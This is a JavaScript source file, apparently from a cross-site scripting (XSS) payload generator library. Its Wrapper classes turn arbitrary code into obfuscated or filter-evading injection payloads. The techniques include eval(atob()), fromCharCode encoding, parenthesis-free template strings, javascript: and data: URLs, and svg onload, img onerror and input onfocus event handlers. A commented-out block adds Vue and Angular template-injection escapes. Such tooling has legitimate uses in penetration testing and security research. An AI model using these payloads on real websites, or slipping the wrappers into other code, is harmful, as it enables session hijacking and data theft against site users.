import { repr } from "./utils.js"
import Payload from "./Payload.js"



/**
 * @param {*} tag 
 */
function isSelfClosing(tag) {
    // hacky way to determine if the element is self closing
    return document.createElement(tag).outerHTML.match(/</g).length == 1
}

function dataUrl(value, mime = "", encoding = "") {
    return `data:${mime};${encoding},${encodeURIComponent(value)}`
}

function dataUrl64(value, mime = "") {
    return dataUrl(btoa(value), mime, "base64")
}

function jsUrl(value) {
    return `javascript:${encodeURIComponent(value)}`
}

function createStringElement(tagName, attributes) {
    // I use a fake element to prevent event from firing, like {src:"a", onerror:"alert"}
    // I don't think you can trigger an event on a custom element not yet inserted to the DOM
    const randomKey = Math.floor(Math.random() * 10e16).toString(16)
    const tag = `_${randomKey}_`
    const el = document.createElement(tag)
    for (const [name, attribute] of Object.entries(attributes)) {
        el.setAttribute(name, attribute)
    }
    let html = el.outerHTML
    if (isSelfClosing(tagName)) {
        // strip the closing tag + html markup ></TAG>
        // and fix the closing markup
        html = html.slice(0, -(tag.length + 4)) + "/>"
    }
    return html.replace(new RegExp(tag, "g"), tagName)
}




/**
 * Used to wrap your {@link Payload}
 * @class 
 * @property {Wrapper | null} parent
 * @property {Function | null} wrapper
 * @property {String | null} payload
 * 
 */
class Wrapper {
    /**
     * 
     * Used internally<br>
     * Use [Wrapper.new]{@link Wrapper.new} instead.
     * 
     * @param {Wrapper} parent The parent wrapper
     * @param {function} wrapper The actual wrapper function
     */
    constructor(parent = null, wrapper = null) {
        this.parent = parent
        this.wrapper = wrapper
    }
    /**
     * Create a [Wrapper_JS]{@link Wrapper_JS} Object
     
     * @graph ($current) {} -> $Wrapper_JS
     * @return {Wrapper_JS}
     */
    static new(){
        return new Wrapper_JS()
    }

    /**
     * Wrap a payload or a string and return it a as string
     * 
     * @param {Payload | String} payload Payload to wrap
     * @example
     * 
     * const p = Payload.new().eval(() => alert(1))
     * const w = Wrapper.new()
     * const code = w.wrap(p)
     * 
     * eval(code)
     * @graph $Wrapper -> {} ($current) {} -> {} (String)
     * @return {string}
     */
    wrap(payload) {
        const code = payload instanceof Payload ? payload.run() : payload.toString()
        return this._compile(code)
    }

    _compile(payload) {
        const code = this.parent ? this.parent._compile(payload) : payload
        return this.wrapper ? this.wrapper(code) : code
    }


}
/**
 * Represent a payload in javascript format
 * @augments Wrapper
 * @alias Wrapper_JS
 * @class 
 * @inheritdoc
 */
class Wrapper_JS extends Wrapper {
    /**
     * Transform any js code into a template string payload without parenthesis.
     * 
     * 
     * @graph  $Wrapper_JS -> {} ($current) {} -> $Wrapper_JS
     * @example
     * 
     * const p = Payload.new().eval(() => alert(1))
     * const w = Wrapper.new().templateString()
     * const c = w.wrap(p)
     * 
     * eval(c)
     * @returns {Wrapper_JS}
     */
    templateString() {
        return new Wrapper_JS(this, code => `Function\`_\${atob\`${btoa(code)}\`}\`\`\``)
    }

    /**
     * Transform any js code into an eval(atob()) payload.
     * 
     * 
     * @graph  $Wrapper_JS -> {} ($current) {} -> $Wrapper_JS
     * @example
     * 
     * const p = Payload.new().eval(() => alert(1))
     * const w = Wrapper.new().evalB64()
     * const c = w.wrap(p)
     * 
     * eval(c)
     * @returns {Wrapper_JS} 
     */
    evalB64() {
        return new Wrapper_JS(this, code => `eval(atob(${repr(btoa(code))}))`)
    }

    /**
     * Transform any js code into an eval(String.fromCharCode(42, 42, ...)) payload.
     * 
     * 
     * @graph  $Wrapper_JS -> {} ($current) {} -> $Wrapper_JS
     * @example
     * 
     * const p = Payload.new().evalStringForCharCode(() => alert(1))
     * const w = Wrapper.new().evalB64()
     * const c = w.wrap(p)
     * 
     * eval(c)
     * @returns {Wrapper_JS} 
     */
    evalStringForCharCode() {
        return new Wrapper_JS(this, code => `eval(String.fromCharCode(${Array.from(code).map(x=>x.charCodeAt(0)).join(",")}))`)
    }

    /**
     * Transform any js code into a javascript: pseudo url.
     * 
     * 
     * @graph  $Wrapper_JS -> {} ($current) {} -> $Wrapper_JSUrl
     * @example
     * 
     * const p = Payload.new().eval(() => alert(1))
     * const w = Wrapper.new().url()
     * 
     * document.location = w.wrap(p)
     * @returns {Wrapper_JSUrl} 
     */
    url() {
        return new Wrapper_JSUrl(this, code => jsUrl(code))
    }

    /**
     * Transform any js code into a data: base64 encoded pseudo url.
     * 
     * @graph  $Wrapper_JS -> {} ($current) {} -> $Wrapper_JSDataUrl
     * @example
     * const p = Payload.new().eval(() => alert(1))
     * const w = Wrapper.new().dataUrl64()
     * 
     * const s = document.createElement('script')
     * s.src = w.wrap(p)
     * document.body.appendChild(s)
     * @returns {Wrapper_JSDataUrl} 
     */
    dataUrl64() {
        return new Wrapper_JSDataUrl(this, code => dataUrl64(code, "application/javascript"))
    }

    /**
     * Transform any js code into a data: pseudo url.
     * 
     * @graph  $Wrapper_JS -> {} ($current) {} -> $Wrapper_JSDataUrl
     * @example
     * const p = Payload.new().eval(() => alert(1))
     * const w = Wrapper.new().dataUrl()
     * 
     * const s = document.createElement('script')
     * s.src = w.wrap(p)
     * document.body.appendChild(s)
     * @returns {Wrapper_JSDataUrl} 
     */
    dataUrl() {
        return new Wrapper_JSDataUrl(this, code => dataUrl(code, "application/javascript"))
    }
    
    /**
     * Transform any js code into a &ltscript&gt element.
     * @graph  $Wrapper_JS -> {} ($current) {} -> $Wrapper_HTML
     * @example
     * const p = Payload.new().eval(() => alert(1))
     * const w = Wrapper.new().script()
     * 
     * const i = document.createElement('iframe')
     * s.srcdoc = w.wrap(p)
     * document.body.appendChild(i)
     * @returns {Wrapper_HTML} 
     */
    script() {
        return new Wrapper_HTML(this, code => {
            return `<script>${code.replace(/<\/script>/g, "<\\/script>")}</script>`
        })
    }

    /**
     * Transform any js code into an document.appendChild(script) payload.
     * @param {string} [selector="body"] Css selector for the parent element
     * @graph  $Wrapper_JS -> {} ($current) {} -> $Wrapper_JS
     * @example
     * const p = Payload.new().eval(() => alert(1))
     * const w = Wrapper.new().appendScript()
     * const c = w.wrap(p)
     * 
     * eval(c)
     * @returns {Wrapper_JS} 
     */
    appendScript(selector = "body") {
        return new Wrapper_JS(this, code => `document.querySelector(${repr(selector)}).appendChild(Object.assign(document.createElement("script"), {innerHTML: ${repr(code)}}))`)
    }

    event(tag, eventName) {
        return new Wrapper_HTML(this, code => createStringElement(tag, { [eventName]: code }))
    }

    /**
     * Transform any js code into a &lt;svg onload&gt; payload.
     * @graph  $Wrapper_JS -> {} ($current) {} -> $Wrapper_HTML
     * @example
     * const p = Payload.new().eval(() => alert(1))
     * const w = Wrapper.new().svgLoad()
     * 
     * document.body.innerHTML = w.wrap(p)
     * @returns {Wrapper_HTML} 
     */
    svgLoad() {
        return new Wrapper_HTML(this, code => createStringElement('svg', { onload: code }))
    }

    /**
     * Transform any js code into a &lt;img onerror&gt; payload.
     * @graph  $Wrapper_JS -> {} ($current) {} -> $Wrapper_HTML
     * @example
     * const p = Payload.new().eval(() => alert(1))
     * const w = Wrapper.new().imgError()
     * 
     * document.body.innerHTML = w.wrap(p)
     * @returns {Wrapper_HTML} 
     */
    imgError() {
        return new Wrapper_HTML(this, code => createStringElement('img', { src: "x:", alt: "", onerror: code }))
    }

    /**
     * Transform any js code into a &lt;input onfocus&gt; payload.
     * @graph  $Wrapper_JS -> {} ($current) {} -> $Wrapper_HTML
     * @example
     * const p = Payload.new().eval(() => alert(1))
     * const w = Wrapper.new().inputFocus()
     * 
     * document.body.innerHTML = w.wrap(p)
     * @returns {Wrapper_HTML} 
     */
    inputFocus() {
        return new Wrapper_HTML(this, code => createStringElement('input', { autofocus: "true", onfocus: code }))

    }
    /**
     * Minify the js code with uglify-js
     * @graph  $Wrapper_JS -> {} ($current) {} -> $Wrapper_JS
     * @example
     * const p = Payload.new().eval(() => alert(1))
     * const w = Wrapper.new().minify()
     * 
     * eval(w.wrap(p))
     */
    minify(){
        if (!window.minify){
            throw Error("uglify-js is not available, use utils.loadUglify() before calling this function.")
        }
        return new Wrapper_JS(this, code => window.minify(code).code)
    }
    /**
     * Add a prefix to a payload
     * @param {String} prefix Prefix to add to the current payload 
     * @graph $Wrapper_JS -> {} ($current) {} -> $Wrapper_JS
     * @returns {Wrapper_JS}
     */
    prepend(prefix){
        return new Wrapper_JS(this, code => `${prefix}${code}`)
    }
    /**
     * Add a sufix to a payload
     * @param {String} sufix Sufix to add to the current payload 
     * @graph $Wrapper_JS -> {} ($current) {} -> $Wrapper_JS
     * @returns {Wrapper_JS}
     */
    append(sufix){
        return new Wrapper_JS(this, code => `${code}${sufix}`)

    }
    /**
     * Add a prefix and a sufix to a payload
     * @param {String} prefix Prefix to add to the current payload 
     * @param {String} sufix Sufix to add to the current payload 
     * @graph $Wrapper_JS -> {} ($current) {} -> $Wrapper_JS
     * @returns {Wrapper_JS}
     */
    enclose(prefix, sufix){
        return this.prepend(prefix).append(sufix)
    }
}


/**
 * Represent a payload in javascript: url format
 * @augments Wrapper
 * @alias Wrapper_JSUrl
 * @class
 * @inheritdoc
 */
class Wrapper_JSUrl extends Wrapper {
    /**
     * Transform any javascript url into a &lt;iframe src&gt; payload.
     * @example
     * const p = Payload.new().eval(() => alert(1))
     * const w = Wrapper.new().url().iframe()
     * 
     * document.body.innerHTML = w.wrap(p)
     * @returns {Wrapper_HTML} 
     */
    iframe() {
        return new Wrapper_HTML(this, code => createStringElement('iframe', { src: code }))
    }

    /**
     * Transform any javascript url into a &lt;object src&gt; payload.
     * @graph  $Wrapper_JSUrl -> {} ($current) {} -> $Wrapper_HTML
     * @example
     * const p = Payload.new().eval(() => alert(1))
     * const w = Wrapper.new().url().object()
     * 
     * document.body.innerHTML = w.wrap(p)
     * @returns {Wrapper_HTML} 
     */
    object() {
        return new Wrapper_HTML(this, code => createStringElement('object', { data: code }))
    }

    /**
     * Transform any javascript url into a &lt;embed src&gt; payload.
     * @graph  $Wrapper_JSUrl -> {} ($current) {} -> $Wrapper_HTML
     * @example
     * const p = Payload.new().eval(() => alert(1))
     * const w = Wrapper.new().url().embed()
     * 
     * document.body.innerHTML = w.wrap(p)
     * @returns {Wrapper_HTML} 
     */
    embed() {
        return new Wrapper_HTML(this, code => createStringElement('embed', { data: code }))
    }

    /**
     * Transform any javascript url into a javascript redirect payload.
     * @graph  $Wrapper_JSUrl -> {} ($current) {} -> $Wrapper_JS
     * @example
     * const p = Payload.new().eval(() => alert(1))
     * const w = Wrapper.new().url().Wrapper_JS()
     * const c = w.wrap(p)
     * 
     * eval(c)
     * @returns {Wrapper_JS} 
     */
    redirect() {
        return new Wrapper_JS(this, code => `window.location=${repr(code)}`)
    }
}

/**
 * Represent a javascript payload in data: url format
 * @augments Wrapper
 * @alias Wrapper_JSDataUrl
 * @class
 * @inheritdoc
 */
class Wrapper_JSDataUrl extends Wrapper {
    /**
     * Transform any javascript data url into a &lt;script src&gt; payload.
     * @graph  $Wrapper_JSDataUrl -> {} ($current) {} -> $Wrapper_HTML
     * @example
     * const p = Payload.new().eval(() => alert(1))
     * const w = Wrapper.new().dataUrl().script()
     * 
     * const i = document.createElement('iframe')
     * s.srcdoc = w.wrap(p)
     * document.body.appendChild(i)
     * @returns {Wrapper_HTML} 
     */
    script() {
        return new Wrapper_HTML(this, code => createStringElement('script', { src: code }))
    }
    /**
     * Transform any javascript data url into a &lt;script src&gt; import payload.
     * @graph  $Wrapper_JSDataUrl -> {} ($current) {} -> $Wrapper_HTML
     * @example
     * const p = Payload.new().eval(() => alert(1))
     * const w = Wrapper.new().dataUrl().scriptImport()
     * 
     * const i = document.createElement('iframe')
     * s.srcdoc = w.wrap(p)
     * document.body.appendChild(i)
     * @returns {Wrapper_HTML} 
     */
    scriptImport() {
        return new Wrapper_HTML(this, code => `<script>import(${repr(code)})</script>`)
    }


}

/**
 * Represent an HTML payload in data: url format
 * @augments Wrapper
 * @alias Wrapper_HTMLDataUrl
 * @class
 * @inheritdoc
 */
class Wrapper_HTMLDataUrl extends Wrapper {
    /**
     * Transform any html data url into a &lt;iframe src&gt; payload.<br>
     * <b> The XSS will trigger on about:blank</b>
     * @graph  $Wrapper_HTMLDataUrl -> {} ($current) {} -> $Wrapper_HTML
     * @example
     * const p = Payload.new().eval(() => alert(1))
     * const w = Wrapper.new().script().dataUrl().iframe()
     * 
     * document.body.innerHTML = w.wrap(p)
     * @returns {Wrapper_HTML} 
     */
    iframe() {
        return new Wrapper_HTML(this, code => createStringElement('iframe', { src: code }))
    }

    /**
     * Transform any html data url into a window.open payload.<br>
     * <b> The XSS will trigger on about:blank</b>
     * @graph  $Wrapper_HTMLDataUrl -> {} ($current) {} -> $Wrapper_JS
     * @example
     * const p = Payload.new().eval(() => alert(1))
     * const w = Wrapper.new().script().dataUrl().windowOpen()
     * 
     * document.body.innerHTML = w.wrap(p)
     * @returns {Wrapper_JS} 
     */
    windowOpen() {
        return new Wrapper_JS(this, code => `window.open(${repr(code)})`)
    }
}

/**
 * Represent a payload in HTML format
 * @augments Wrapper
 * @alias Wrapper_HTML
 * @class
 * @inheritdoc
 */
class Wrapper_HTML extends Wrapper {
    /**
     * Transform any html into a &lt;iframe srcdoc&gt; payload.
     * @graph  $Wrapper_HTML -> {} ($current) {} -> $Wrapper_HTML
     * @example
     * const p = Payload.new().eval(() => alert(1))
     * const w = Wrapper.new().script().iframe()
     * 
     * document.body.innerHTML = w.wrap(p)
     * @returns {Wrapper_HTML} 
     */
    iframe() {
        return new Wrapper_HTML(this, code => createStringElement('iframe', { srcdoc: code }))
    }

    /**
     * Transform any html into a document.write payload.
     * @graph  $Wrapper_HTML -> {} ($current) {} -> $Wrapper_JS
     * @example
     * const p = Payload.new().eval(() => alert(1))
     * const w = Wrapper.new().script().write()
     * const c = w.wrap(p)
     * 
     * eval(c)
     * @returns {Wrapper_JS} 
     */
    write() {
        return new Wrapper_JS(this, code => `document.write(${repr(code)})`)
    }

    /**
     * Transform any html into a el.innerHTML= payload.
     * @param {string} [target="body"] CSS selector for the parent element.
     * @graph  $Wrapper_HTML -> {} ($current) {} -> $Wrapper_JS
     * @example
     * const p = Payload.new().eval(() => alert(1))
     * const w = Wrapper.new().script().innerHTML()
     * const c = w.wrap(p)
     * 
     * eval(c)
     * @returns {Wrapper_JS} 
     */
    innerHTML(target = "body") {
        return new Wrapper_JS(this, code => `document.querySelector(${repr(target)}).innerHTML = ${repr(code)}`)
    }

    /**
     * Transform any html into a data url base64 encoded payload.
     * @graph  $Wrapper_HTML -> {} ($current) {} -> $Wrapper_HTMLDataUrl
     * @returns {Wrapper_HTMLDataUrl} 
     */
    dataUrl64() {
        return new Wrapper_HTMLDataUrl(this, code => dataUrl64(code, "text/html"))
    }

    /**
     * Transform any html into a data url payload.
     * @returns {Wrapper_HTMLDataUrl} 
     * @graph  $Wrapper_HTML -> {} ($current) {} -> $Wrapper_HTMLDataUrl
     */
    dataUrl() {
        return new Wrapper_HTMLDataUrl(this, code => dataUrl(code, "text/html"))
    }


    /**
     * Add a prefix to a payload
     * @param {String} prefix Prefix to add to the current payload 
     * @graph $Wrapper_HTML -> {} ($current) {} -> $Wrapper_HTML
     * @returns {Wrapper_HTML}
     */
    prepend(prefix){
        return new Wrapper_HTML(this, code => `${prefix}${code}`)
    }
    /**
     * Add a sufix to a payload
     * @param {String} sufix Sufix to add to the current payload 
     * @graph $Wrapper_HTML -> {} ($current) {} -> $Wrapper_HTML
     * @returns {Wrapper_HTML}
     */
    append(sufix){
        return new Wrapper_HTML(this, code => `${code}${sufix}`)

    }
    /**
     * Add a prefix and a sufix to a payload
     * @param {String} prefix Prefix to add to the current payload 
     * @param {String} sufix Sufix to add to the current payload 
     * @graph $Wrapper_HTML -> {} ($current) {} -> $Wrapper_HTML
     * @returns {Wrapper_HTML}
     */
    enclose(prefix, sufix){
        return this.prepend(prefix).append(sufix)
    }
}
export default Wrapper

/*

    vue3() {
        return new Wrapper(this, code => `{{_openBlock.constructor('${code.replace(/'/g, "\\'")}')()}}`)
    }

    vue2() {
        return new Wrapper(this, code => `{{constructor.constructor('${code.replace(/'/g, "\\'")}')()}}`)
    }

    angular() {
        return new Wrapper(this, code => `{{constructor.constructor('${code.replace(/'/g, "\\'")}')()}}`)
    }
*/